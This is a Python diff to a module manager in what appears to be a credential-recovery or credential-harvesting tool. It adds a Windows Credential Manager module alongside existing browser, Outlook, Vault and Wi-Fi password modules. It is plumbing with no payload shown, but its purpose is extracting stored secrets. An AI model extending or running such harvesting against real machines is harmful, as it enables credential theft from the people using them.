@@ -6,6 +6,7 @@ from modules.firefox.mozilla import Mozilla
 if sys.platform.startswith('win32'):
 	import libs.windows.winstructure as win
 	from modules.windows.ie import IE
+	from modules.windows.credman import Credman
 	from modules.windows.outlook import Outlook
 	from modules.windows.vault import Vault
 	from modules.windows.wifi import Wifi
@@ -51,6 +52,7 @@ class ModuleManager:
 			'chromium': [],
 			'firefox': [],
 			'internet explorer': False,
+			'credman': False,
 			'outlook': False,
 			'wifi': False
 		}
@@ -76,13 +78,19 @@ class ModuleManager:
 				self.targets['internet explorer'] = True
 
 			if sys.platform.startswith('win32'):
-				self.targets['wifi'] = True
+				self.targets['credman'] = True
 
 			if sys.platform.startswith('win32'):
 				self.targets['outlook'] = True
+
+			if sys.platform.startswith('win32'):
+				self.targets['wifi'] = True
 		else:
 			if 'internet explorer' in modules and sys.platform.startswith('win32'):
 				self.targets['internet explorer'] = True
+
+			if 'credman' in modules and sys.platform.startswith('win32'):
+				self.targets['credman'] = True
 
 			if 'outlook' in modules and sys.platform.startswith('win32'):
 				self.targets['outlook'] = True
@@ -99,6 +107,7 @@ class ModuleManager:
 			'chromium': [],
 			'firefox': [],
 			'internet explorer': False,
+			'credman': False,
 			'outlook': False,
 			'wifi': False
 		}
@@ -117,6 +126,8 @@ class ModuleManager:
 							drivers.extend([Vault()])
 						else:
 							drivers.extend([IE()])
+					case 'credman':
+						drivers.extend([Credman()])
 					case 'outlook':
 						drivers.extend([Outlook()])
 					case 'wifi':
